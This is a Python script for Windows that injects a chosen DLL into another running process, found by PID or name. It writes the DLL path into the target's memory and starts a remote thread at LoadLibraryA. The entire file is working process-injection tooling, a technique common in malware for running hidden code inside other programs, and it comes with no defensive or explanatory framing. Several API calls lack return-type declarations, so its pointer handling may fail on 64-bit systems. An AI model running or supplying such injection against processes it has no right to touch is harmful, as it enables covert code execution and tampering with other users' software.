import sys
import os
import argparse
import psutil
from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32

# --- Constants & Types ---
MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = 0x1F0FFF
INFINITE = 0xFFFFFFFF

# --- API Prototypes ---
def setup_prototypes():
    kernel32.OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
    kernel32.OpenProcess.restype = wintypes.HANDLE

    kernel32.IsWow64Process.argtypes = (wintypes.HANDLE, POINTER(wintypes.BOOL))
    kernel32.IsWow64Process.restype = wintypes.BOOL

    kernel32.WaitForSingleObject.argtypes = (wintypes.HANDLE, wintypes.DWORD)
    kernel32.WaitForSingleObject.restype = wintypes.DWORD

    kernel32.GetExitCodeThread.argtypes = (wintypes.HANDLE, POINTER(wintypes.DWORD))
    kernel32.GetExitCodeThread.restype = wintypes.BOOL

setup_prototypes()

def get_pid_by_name(name):
    """Find PID by process name using psutil."""
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == name.lower():
            return proc.info['pid']
    return None

def is_64bit_process(h_process):
    """Check if the target process is 64-bit."""
    # If we are on 64-bit Windows:
    # IsWow64 = True means the process is 32-bit running on 64-bit OS.
    # IsWow64 = False means the process is native 64-bit.
    is_wow64 = wintypes.BOOL()
    kernel32.IsWow64Process(h_process, byref(is_wow64))
    return not is_wow64.value if sys.maxsize > 2**32 else True

def inject(pid, dll_path):
    if not os.path.exists(dll_path):
        print(f"[-] DLL not found: {dll_path}")
        return

    dll_bytes = os.path.abspath(dll_path).encode('ascii')
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    
    if not h_process:
        print(f"[-] Could not open PID {pid}: {WinError()}")
        return

    try:
        # Architecture Check
        target_is_64 = is_64bit_process(h_process)
        python_is_64 = sys.maxsize > 2**32
        if target_is_64 != python_is_64:
            print(f"[-] Architecture Mismatch! Target is {'64' if target_is_64 else '32'}-bit, "
                  f"but Python is {'64' if python_is_64 else '32'}-bit.")
            return

        # Allocate & Write
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_bytes)+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_bytes, len(dll_bytes)+1, byref(c_size_t(0)))

        # Get LoadLibraryA and Execute
        h_k32 = kernel32.GetModuleHandleA(b"kernel32.dll")
        load_lib = kernel32.GetProcAddress(h_k32, b"LoadLibraryA")
        
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_lib, remote_mem, 0, None)
        
        if h_thread:
            print(f"[*] Thread created. Waiting for LoadLibraryA to return...")
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            
            # Get return value of LoadLibraryA (the base address of the loaded DLL)
            exit_code = wintypes.DWORD()
            kernel32.GetExitCodeThread(h_thread, byref(exit_code))
            
            if exit_code.value != 0:
                print(f"[+] Success! DLL loaded at base: {hex(exit_code.value)}")
            else:
                print("[-] LoadLibraryA failed inside the target process.")
            
            kernel32.CloseHandle(h_thread)
    finally:
        kernel32.CloseHandle(h_process)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-p", "--pid", type=int)
    group.add_argument("-n", "--name", type=str)
    parser.add_argument("-d", "--dll", required=True)
    args = parser.parse_args()

    target_pid = args.pid if args.pid else get_pid_by_name(args.name)
    
    if target_pid:
        inject(target_pid, args.dll)
    else:
        print(f"[-] Could not find process: {args.name}")
